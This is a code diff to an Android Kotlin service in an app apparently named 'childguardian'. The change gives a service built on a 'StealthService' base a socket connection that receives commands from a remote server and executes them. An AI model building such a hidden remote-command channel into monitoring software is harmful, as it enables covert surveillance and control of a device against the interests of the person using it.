@@ -11,9 +11,24 @@ import androidx.core.app.NotificationCompat
 import com.childguardian.services.base.StealthService
 import dagger.hilt.android.AndroidEntryPoint
 import timber.log.Timber
-
+import com.childguardian.data.remote.socket.SocketManager
+import com.childguardian.data.repository.DeviceRepository
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import javax.inject.Inject
 @AndroidEntryPoint
 class CoreService : StealthService() {
+    @Inject
+    lateinit var gson: com.google.gson.Gson
+
+    @Inject
+    lateinit var commandProcessor: com.childguardian.domain.command.CommandProcessor
+    @Inject
+    lateinit var socketManager: SocketManager
+
+    @Inject
+    lateinit var deviceRepository: DeviceRepository
 
     companion object {
         private const val CHANNEL_ID = "core_sync_channel"
@@ -23,7 +38,28 @@ class CoreService : StealthService() {
     override fun onCreate() {
         super.onCreate()
         Timber.d("CoreService created")
+        // Get deviceId from local storage and connect socket
+        CoroutineScope(Dispatchers.IO).launch {
+            val deviceId = deviceRepository.getDeviceInfoSync()?.deviceId
+            if (deviceId != null) {
+                socketManager.connect(deviceId)
 
+                // ADD THIS LISTENER HERE
+                socketManager.on("command") { args ->
+                    val data = args[0].toString()
+                    Timber.d("Command received from server: $data")
+                    try {
+                        val remoteCommand = gson.fromJson(
+                            data,
+                            com.childguardian.domain.command.RemoteCommand::class.java
+                        )
+                        commandProcessor.processCommand(remoteCommand)
+                    } catch (e: Exception) {
+                        Timber.e(e, "Error parsing command from server")
+                    }
+                }
+            }
+        }
         // >>> THE SAFETY SWITCH: Start the notification immediately <<<
         startForegroundServiceSafely()
     }
